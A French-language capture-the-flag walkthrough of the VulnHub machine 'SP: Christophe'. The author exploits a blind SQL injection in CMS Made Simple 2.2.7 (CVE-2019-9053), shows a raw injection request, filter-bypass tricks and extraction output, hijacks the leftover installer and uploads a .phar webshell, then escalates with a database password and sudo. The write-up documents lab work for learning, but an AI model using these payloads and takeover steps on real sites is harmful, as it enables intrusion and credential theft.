# Solution du CTF SP: Christophe de VulnHub

On continue sur cette série de CTF nommée après des personnages de la série South Park. [SP: christophe](https://vulnhub.com/entry/sp-christophe-v102,273/) est toujours un boot2root disponible sur VulnHub.

Ce CTF m'a posé quelques difficultés car il y a un troll (fausse piste) énorme dont je ne pourrais pas dire si il était intentionel ou non.

```
Nmap scan report for 192.168.56.76
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1411d18b120b78be044f740d34a5fa07 (RSA)
|   256 476972f9b77633586feb8d1cda9eb5c6 (ECDSA)
|_  256 790859b0dfec13319ed824541db62744 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2018. All rights reserved.
|_http-title: Home - Viva La Resistance!
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## Not so simple

L'appli web sur le port 80 envoie la couleur

```
This site is powered by CMS Made Simple version 2.2.7
```

On se rend donc normalement sur exploit-db où l'on découvre une bonne quantité d'exploits pour ledit software. La majorité requiert quand même une authentification, voire même un accès admin.

Il en reste tout de même un qui matche la version et ne nécessite aucun compte :

[CMS Made Simple &lt; 2.2.10 - SQL Injection - PHP webapps Exploit](https://www.exploit-db.com/exploits/46635)

Il s'agit d'une faille d'injection SQL en aveugle. L'exploit parvient après un moment à extraire le hash de l'utilisateur :

```
[+] Salt for password found: 932129a6bd8545bd
[+] Username found: christophe
[+] Email found: christophe@christophe.local
[+] Password found: 7908b1494f82ed320b288a0e839bfbc5
```

L'exploit a aussi une option pour casser le hash, ce qui n'est pas très efficace car ce dernier est codé en Python (et sur le plan CPU on est loin du C, Golang ou Rust).

Le format du hash est à priori `md5($s.$p)`. Le salt est spécifique à la base de données et non à l'utilisateur. On peut tenter de casser le hash avec hashcat depuis une instance [penglab: Abuse of Google Colab for cracking hashes. 🐧](https://github.com/mxrch/penglab) :

```
!hashcat -m 20 -a 3 7908b1494f82ed320b288a0e839bfbc5:932129a6bd8545bd /content/wordlists/rockyou.txt
```

Mais rien à faire, le hash ne se casse pas.

## Deep dive

L'exploit est fonctionnel mais ses capacités sont limitées. Son code lui permet uniquement de récupérer les informations vues plus haut. Rien ne permet de fouiller plus largement dans la base de données.

En écoutant le trafic réseau lorsque l'on lance l'exploit on peut voir que ce dernier s'injecte visiblement dans la clause `WHERE` en ajoutant une condition `AND` :

```
GET /moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(1)+from+cms_siteprefs+where+sitepref_value+like+0x3125+and+sitepref_name+like+0x736974656d61736b)+--+ HTTP/1.1
```

`sqlmap` est capable de détecter l'injection malheureusement toute tentative d'extraire les données échoue. Là où sqlmap fait plus fort en revanche c'est qu'il est capable de voir que la vulnérabilité n'est pas juste time-based mais aussi simplement du type `boolean blind` c'est à dire que le script PHP vulnérable ne retourne pas tout à fait le même contenu en fonction que la condition `AND` ajoutée. Il propose même ici de rajouter l'option `--string="Dec 23, 2018"` pour faciliter l'exploitation.

En jouant à tenter d'injecter des commandes SQL dans l'URL je me rend compte que le script n'accepte pas les apostrophes, guillemets, virgules, signes inférieur et supérieur...

Ca s'explique par exemple car le code [fait un split](https://tpetersonkth.github.io/2021/10/02/CVE-2019-9053.html) sur les virgules.

Pour bypasser toutes ces restrictions on peut :

- faire une simple comparaison `=` au lieu d'utiliser `<` et `>` ce qui implique de tester toutes les valeurs (ou alors utiliser l'instruction `BETWEEN`)

- utiliser l'autre façon de spécifier l'instruction LIMIT à savoir au lieu de faire `LIMIT N, M`, le remplacer par  `LIMIT M OFFSET N`

- utiliser `LIKE 0xYY25` à la place d'un `SUBSTRING(str, pos, len)` où `YY ` représente un début de la chaine de caractères à definer et le 25 correspond au caractère `%` (pour indiquer qu'on fait une recherche par préfixe)

J'ai écrit mon propre exploit qui se restreint aux caractères autorisés. Il pourrait être encore amélioré en utilisant `BETWEEN` mais je n'avais pas envie d'aller plus loin. Il propose un jeu d'options propre de `sqlmap`.

Le code est un peu long alors je l'ai publié sur Github : [exploits/devloop-cve-2019-9053.py](https://github.com/devl00p/exploits/blob/main/devloop-cve-2019-9053.py).

Dans la pratique ça donne ceci :

```shellsession
$ python exploit.py --current-user http://192.168.56.76/
INFO:root:[+] Fetching current user
cmsms@localhost
$ python exploit.py --current-db http://192.168.56.76/
INFO:root:[+] Fetching current database
cmsms_db
$ python exploit.py -D cmsms_db --tables http://192.168.56.76/
INFO:root:[+] Fetching number of tables in database cmsms_db
INFO:root:[+] Found 53 tables in database cmsms_db
INFO:root:[+] Fetching table name #0 of database cmsms_db
cms_additional_users
INFO:root:[+] Fetching table name #1 of database cmsms_db
cms_additional_users_seq
INFO:root:[+] Fetching table name #2 of database cmsms_db
cms_adminlog
--- snip ---
INFO:root:[+] Fetching table name #49 of database cmsms_db
cms_users
INFO:root:[+] Fetching table name #50 of database cmsms_db
cms_users_seq
INFO:root:[+] Fetching table name #51 of database cmsms_db
cms_user_groups
INFO:root:[+] Fetching table name #52 of database cmsms_db
cms_version
$ python exploit.py -D cmsms_db -T cms_users --columns  http://192.168.56.76/
INFO:root:[+] Fetching number of columns in cmsms_db.cms_users
INFO:root:[+] Fetching column name #0 of cmsms_db.cms_users
user_id
INFO:root:[+] Fetching column name #1 of cmsms_db.cms_users
username
INFO:root:[+] Fetching column name #2 of cmsms_db.cms_users
password
INFO:root:[+] Fetching column name #3 of cmsms_db.cms_users
admin_access
INFO:root:[+] Fetching column name #4 of cmsms_db.cms_users
first_name
INFO:root:[+] Fetching column name #5 of cmsms_db.cms_users
last_name
INFO:root:[+] Fetching column name #6 of cmsms_db.cms_users
email
INFO:root:[+] Fetching column name #7 of cmsms_db.cms_users
active
INFO:root:[+] Fetching column name #8 of cmsms_db.cms_users
create_date
INFO:root:[+] Fetching column name #9 of cmsms_db.cms_users
modified_date
$ python exploit.py -D cmsms_db -T cms_users -C password --dump  http://192.168.56.76/
INFO:root:[+] Fetching number of rows in cmsms_db.cms_users
INFO:root:[+] Found 1 rows in table cmsms_db.cms_users
idx 0: 7908b1494f82ed320b288a0e839bfbc5
```

Il y a une option qui revient à faire ce que le précédent exploit faisait :

```shellsession
$ python exploit.py --admin-hash http://192.168.56.76/
admin name: christophe
admin email: christophe@christophe.local
admin hash: 7908b1494f82ed320b288a0e839bfbc5
salt: 932129a6bd8545bd
JohnTheRipper hash: christophe:$dynamic_4$7908b1494f82ed320b288a0e839bfbc5$932129a6bd8545bd:::::::
```

Le petit bonus c'est que ça donne aussi le hash dans un format utilisable par `JohnTheRipper` :)

## DIDN'T CLEAN UP LOL

Ok revenons à nos moutons : j'ai passé des heures sur cette failel SQL et au final il n'y a rien d'intéressant à à trouver. L'auteur du CTF a confirmé qu'il n'y avait pas d'étape de cassage de hash et comme on est sur une injection dans une requête `SELECT` on ne peut pas altérer la base de données.

De plus ici la version doit MySQL doit être trop récente pour visiblement autoriser les `LOAD_FILE` et `INTO OUTFILE` hors de certains chemins prédéfinis...

Une énumération web ne semble rien retourner qui sorte du cadre de *CMS Made Simple* :

```
301        9l       28w      314c http://192.168.56.76/admin
301        9l       28w      312c http://192.168.56.76/lib
301        9l       28w      316c http://192.168.56.76/uploads
301        9l       28w      316c http://192.168.56.76/modules
301        9l       28w      315c http://192.168.56.76/assets
301        9l       28w      319c http://192.168.56.76/lib/assets
301        9l       28w      329c http://192.168.56.76/lib/assets/templates
301        9l       28w      320c http://192.168.56.76/lib/classes
301        9l       28w      323c http://192.168.56.76/modules/Search
301        9l       28w      330c http://192.168.56.76/modules/Search/images
301        9l       28w      333c http://192.168.56.76/modules/Search/templates
301        9l       28w      312c http://192.168.56.76/tmp
301        9l       28w      318c http://192.168.56.76/tmp/cache
301        9l       28w      329c http://192.168.56.76/lib/classes/internal
301        9l       28w      328c http://192.168.56.76/modules/Search/lang
301        9l       28w      312c http://192.168.56.76/doc
301        9l       28w      324c http://192.168.56.76/tmp/templates_c
301        9l       28w      316c http://192.168.56.76/install
301        9l       28w      324c http://192.168.56.76/admin/templates
301        9l       28w      322c http://192.168.56.76/admin/plugins
301        9l       28w      321c http://192.168.56.76/admin/themes
301        9l       28w      319c http://192.168.56.76/admin/lang
301        9l       28w      320c http://192.168.56.76/lib/plugins
301        9l       28w      323c http://192.168.56.76/uploads/images
301        9l       28w      322c http://192.168.56.76/assets/images
200        0l        0w        0c http://192.168.56.76/uploads/
200        1l        5w       24c http://192.168.56.76/doc/
200        1l        5w       24c http://192.168.56.76/modules/Search/templates/
200      127l     1218w        0c http://192.168.56.76/
```

La présence du dossier `install` est suspecte, un certain nombre d'applications web conseillent de supprimer les fichiers une fois l'installation terminée.

Une énumération dans ce dossier ne retourne absolument rien mais en cherchant sur le web on trouve cette documentation : [Start Installation Assistant : : CMS Made Simple 2.x Official Documentation](https://docs.cmsmadesimple.org/installation/installing) qui indique qu'il fait charger le fichier `cmsms-2.X.Y-install.php` correspondant à la version du CMS donc dans notre cas `/install/cmsms-2.2.7-install.php`.

On entame alors la précédure d'installation :

![VulnHub SP Christophe CTF CMS Made Simple install](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/christophe/install1.jpg)

On avance dans les étapes puis arrive finalement le moment où l'on doit saisir les informations pour la base de données.

Je commence par mettre en écoute un container MySQL sur lequel je créé une base `cms` :

```shellsession
$ docker run --rm -p 3306:3306 --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:5.7
4c101fa79ee693249e5aa876f83a8bd401267fe28f180c41a7740d802ad6da66
$ mysql -h 127.0.0.1 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> create database cms;
Query OK, 1 row affected (0,001 sec)

MySQL [(none)]> ^DBye
```

puis je renseigne ma DB :

![VulnHub SP Christophe CTF CMS Made Simple install 2](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/christophe/install2.jpg)

Pour terminer je définis l'utilisateur administrateur :

![VulnHub SP Christophe CTF CMS Made Simple install 3](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/christophe/install3.jpg)

On continue jusqu'à la fin et ce qui se passe en réalité c'est que l'installation est faite dans `/install` au lieu de s'effectuer à la racine web comme l'installation existante.

Par conséquent je peux me connecter via l'interface d'administration à `/install/admin`.

Là je peux uploader des fichiers en allant sous `Contenu > Gestionnaire de fichiers` mais l'extension `.php` semble refusée.

Il y a sur `exploit-db` un exploit qui permet un upload arbitraire : [CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/48779)

En regardant le code on s'apperçoit qu'il utilise simplement l'extension `.phar`. Je fais donc de même pour uploader un webshell et ça passe :)

J'ai ainsi une RCE à l'adresse `/install/uploads/shell.phar?cmd=id` qui me répond `uid=1001(christophe) gid=1001(christophe) groups=1001(christophe),27(sudo)`

## Quick et flute

On obtient le flag de l'utilisateur :

```shellsession
christophe@christophe:/home/christophe$ cat flag.txt 
90daf3db12d09f5
```

et on retrouve dans mot de passe dans la config du CMS (la configuration initiale) :

```php
christophe@christophe:/var/www/html$ cat config.php 
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'cmsms';
$config['db_password'] = 'thisisaSuperlongandh4rdpassword-';
$config['db_name'] = 'cmsms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Berlin';
```

Avec le mot de passe on peut sudo et c'est finit :

```shellsession
christophe@christophe:/var/www/html$ sudo -l
[sudo] password for christophe: 
Matching Defaults entries for christophe on christophe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User christophe may run the following commands on christophe:
    (ALL : ALL) ALL
```

```shellsession
christophe@christophe:/home/christophe$ sudo su
root@christophe:/home/christophe# cd /root
root@christophe:~# ls
flag.txt
root@christophe:~# cat flag.txt 
4f4c08c06145ca96b
```

Un peu déçu, j'ai passé beaucoup de temps sur la faille SQL et au final j'ai installé un CMS et exécuté une commande sudo...

*Publié le 17 décembre 2022*